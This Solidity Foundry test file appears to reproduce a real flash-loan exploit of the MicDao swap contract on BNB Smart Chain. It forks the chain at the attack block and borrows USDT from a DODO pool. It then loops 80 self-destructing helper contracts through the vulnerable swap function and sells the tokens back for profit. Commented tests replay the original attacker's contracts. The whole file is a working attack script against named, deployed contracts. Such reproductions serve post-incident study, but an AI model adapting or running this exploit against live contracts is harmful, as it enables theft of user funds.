// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../interface.sol";

interface IMicDaoSwap {
    function swap(uint256 amount, address originToken) external;
}

contract HelperContract {
    IMicDaoSwap private constant SwapContract = IMicDaoSwap(0x19345233ea7486c1D5d780A19F0e303597E480b5);
    IERC20 private constant usdt = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 private constant MicDao = IERC20(0xf6876f6AB2637774804b85aECC17b434a2B57168);
    address private immutable owner;

    constructor() {
        owner = msg.sender;
    }

    function work() external {
        usdt.approve(address(SwapContract), type(uint256).max);
        SwapContract.swap(2_000 ether, owner);
        MicDao.transfer(owner, MicDao.balanceOf(address(this)));
        selfdestruct(payable(owner));
    }
}

contract MicDaoAttacker is Test {
    IERC20 constant usdt = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 constant MicDao = IERC20(0xf6876f6AB2637774804b85aECC17b434a2B57168);
    IDPPOracle constant dodo = IDPPOracle(0x26d0c625e5F5D6de034495fbDe1F6e9377185618);
    IUniswapV2Router constant router = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    function setUp() public {
        vm.createSelectFork("bsc");
        vm.label(address(usdt), "USDT");
        vm.label(address(MicDao), "micDao");
        vm.label(address(dodo), "dodo");
        vm.label(address(router), "PancakeRouter");
    }

    function testExploit() public {
        uint attackBlockNumber = 32711747;
        vm.rollFork(attackBlockNumber);

        deal(address(usdt), address(this), 0);

        dodo.flashLoan(0, (usdt.balanceOf(address(dodo)) * 99) / 100, address(this), "0x00");

        emit log_named_decimal_uint("Total USDT profit", usdt.balanceOf(address(this)), usdt.decimals());
    }

    function DPPFlashLoanCall(address /*sender*/, uint256 /*baseAmount*/, uint256 quoteAmount, bytes calldata /*data*/) external {
        usdt.approve(address(router), type(uint256).max);
        MicDao.approve(address(router), type(uint256).max);
        usdtToMicDao();

        uint8 i;
        while (i < 80) {
            HelperContract helper = new HelperContract();
            usdt.transfer(address(helper), 2_000 ether);
            helper.work();
            ++i;
        }

        MicDaoTousdt();
        usdt.transfer(msg.sender, quoteAmount);
    }

    function usdtToMicDao() internal {
        address[] memory path = new address[](2);
        path[0] = address(usdt);
        path[1] = address(MicDao);

        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            500_000 ether,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function MicDaoTousdt() internal {
        address[] memory path = new address[](2);
        path[0] = address(MicDao);
        path[1] = address(usdt);

        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            MicDao.balanceOf(address(this)),
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    // function testFirstAttackContract() external {
    //     uint attackBlockNumber = 32711519;
    //     vm.rollFork(attackBlockNumber);
    //     vm.startPrank(0xCD03ed98868A6cd78096F116A4b56a5f2C67757d, 0xCD03ed98868A6cd78096F116A4b56a5f2C67757d);
    //     (bool success, ) = address(0x19925F6f3Fd654Fe98c0a16D751E24Dd176AE8f9).call(hex"8a27ecfb");
    //     require(success);
    // }

    // function testSecondAttackContract() external {
    //     uint attackBlockNumber = 32711643;
    //     vm.rollFork(attackBlockNumber);
    //     vm.startPrank(0xCD03ed98868A6cd78096F116A4b56a5f2C67757d, 0xCD03ed98868A6cd78096F116A4b56a5f2C67757d);
    //     vm.txGasPrice(3000300501);
    //     uint256 beforeAttack = usdt.balanceOf(address(0xA5b92A7abebF701B5570db57C5d396622B6Ed348));
    //     (bool success, ) = address(0x0697B5dc2365e2735Bc1F086E097bcf0c61f518d).call(hex"8a27ecfb");
    //     require(success);
    //     emit log_named_decimal_uint("Total USDT profit", usdt.balanceOf(address(0xA5b92A7abebF701B5570db57C5d396622B6Ed348)) - beforeAttack, usdt.decimals());
    // }

    // function testThirdAttackContract() external {
    //     uint attackBlockNumber = 32711700;
    //     vm.rollFork(attackBlockNumber);
    //     vm.startPrank(0xCD03ed98868A6cd78096F116A4b56a5f2C67757d, 0xCD03ed98868A6cd78096F116A4b56a5f2C67757d);
    //     vm.txGasPrice(3000300501);
    //     uint256 beforeAttack = usdt.balanceOf(address(0xA5b92A7abebF701B5570db57C5d396622B6Ed348));
    //     (bool success, ) = address(0x502b4A51ca7900F391d474268C907B110a277d6F).call(hex"8a27ecfb");
    //     require(success);
    //     emit log_named_decimal_uint("Total USDT profit", usdt.balanceOf(address(0xA5b92A7abebF701B5570db57C5d396622B6Ed348)) - beforeAttack, usdt.decimals());
    // }
}